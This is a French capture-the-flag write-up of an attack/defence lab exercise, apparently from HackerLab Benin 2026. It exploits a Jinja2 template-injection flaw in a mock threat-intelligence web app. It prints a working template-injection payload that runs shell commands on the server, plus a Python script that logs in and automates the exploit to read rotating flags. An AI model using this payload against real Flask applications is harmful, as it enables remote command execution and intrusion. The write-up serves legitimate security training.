---
title: "Death Match · Battle 01 · SSTI Jinja2"
platform: "HackerLab Benin 2026"
category: "web"
difficulty: "—"
points: 0
os: "—"
date: 2026-11-20
author: "DazBot13-boopt, elielfresnel"
author_github: "DazBot13-boopt"
source: "https://github.com/DazBot13-boopt/hackerlab-benin-2026-wu/blob/main/web/hl-deathmatch-battle01.md"
tags: [hackerlab-benin-2026, web]
status: published
---

# Death Match : Battle 01 · SSTI Jinja2 sur Meridian CTI

**Catégorie** : web / A&D  
**Flag (rotation au moment de la capture)** : `HLB2026{f2b0efcfdc3c63001f425be4e75d63057caa554d91571fa1}`

## TL;DR

La plateforme Meridian CTI Platform v2.1.0 est vulnérable à une SSTI Jinja2 dans le paramètre `title` de `/indicators/report`. Le RCE permet de lire `/flags/user.txt` qui tourne toutes les ~10 minutes.

## Topologie

```
Attack  : 10.200.60.2
Defend  : 10.200.59.2
VPN     : interface hl_ad, routes 10.200.59.0/24 et 10.200.60.0/24
```

Ports ouverts sur la cible : `22/ssh`, `443/https`, `8443/https-alt`.  
Port 443 : Meridian CTI Platform v2.1.0, Flask/Gunicorn derrière nginx.  
Port 8443 : Internal API avec `/api/docs` exposé.

## SSTI Jinja2

La création de compte est ouverte. Après login, l'endpoint `/indicators/report?title={{7*7}}` retourne `<title>49</title>` : confirmation immédiate de la SSTI.

Le payload RCE pour lire le flag :

```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flags/user.txt').read()}}
```

Le token hexadécimal retourné dans `<title>` est la valeur brute du flag (sans le préfixe `HLB2026{}`).

## Script de farm

Les flags tournent toutes les ~10 minutes. Le script suivant lit et affiche automatiquement la valeur courante :

```python
#!/usr/bin/env python3
import html, re, urllib.parse, urllib.request, http.cookiejar

BASE = "https://10.200.60.2"
USER, PASSWORD = "analyst2026", "A2026pass"

ctx = __import__("ssl")._create_unverified_context()
cookies = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(
    urllib.request.HTTPCookieProcessor(cookies),
    urllib.request.HTTPSHandler(context=ctx),
)

def post(path, data):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(BASE + path, data=body, method="POST")
    return opener.open(req, timeout=8).read()

post("/login", {"username": USER, "password": PASSWORD})
cmd = "cat /flags/user.txt"
payload = "{{request.application.__globals__.__builtins__.__import__('os').popen(" + repr(cmd) + ").read()}}"
query = urllib.parse.urlencode({"title": payload})
req = urllib.request.Request(BASE + "/indicators/report?" + query)
page = opener.open(req, timeout=8).read().decode("utf-8", "replace")
title = re.search(r"<title>(.*?)</title>", page, re.S)
token = html.unescape(title.group(1)).strip() if title else ""
if not re.fullmatch(r"[0-9a-f]{48}", token):
    raise SystemExit(f"unexpected token: {token!r}")
print(f"HLB2026{{{token}}}")
```

## À retenir

Le flag A/D tourne régulièrement : la valeur capturée en session ne sera plus valide après rotation. Il faut soumettre via le dashboard Death Match immédiatement après lecture, pas en fin de session.
